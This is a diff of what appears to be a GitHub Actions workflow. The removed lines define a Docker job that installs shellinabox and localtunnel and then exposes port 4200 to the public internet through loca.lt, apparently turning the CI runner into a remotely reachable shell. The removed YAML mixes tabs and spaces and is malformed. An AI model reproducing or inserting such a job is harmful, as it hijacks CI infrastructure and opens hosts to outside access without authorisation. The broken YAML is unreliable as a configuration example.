@@ -1,40 +1,8 @@
 on:
   push:
-    branches-ignore:
-      - l10n_develop
-      - gh-pages
-    paths-ignore:
-      - '*.md'
-      - 'LICENSE'
-      - 'monitoring/grafana-dashboard.json'
-      - 'screenshots/**'
-    tags-ignore:
-      - '*'
+    branches: [ master ]
   pull_request:
-    paths-ignore:
-      - '*.md'
-      - 'LICENSE'
-      - 'data/static/i18n/*.json'
-      - 'frontend/src/assets/i18n/*.json'
-					
-jobs:
-	runindocker:
-		runs-on: ubuntu-latest
-		steps:
-			- name: "Check out the repo"
-			  uses: actions/checkout@v4
-			- name: "app with"
-			  uses: addnab/docker-run-action@v3
-			  with:
-    			   image: dcmjid/juice-shop:latest
-				   run: |
-    			apt update
-    			composer install
-    			apt install -y curl openssl iptables shellinabox npm
-    			npm install -g localtunnel
-    			lt --port 4200 | curl https://loca.lt/mytunnelpassword
-				
-				
+    branches: [ master ]
 
 jobs:
     runindocker:
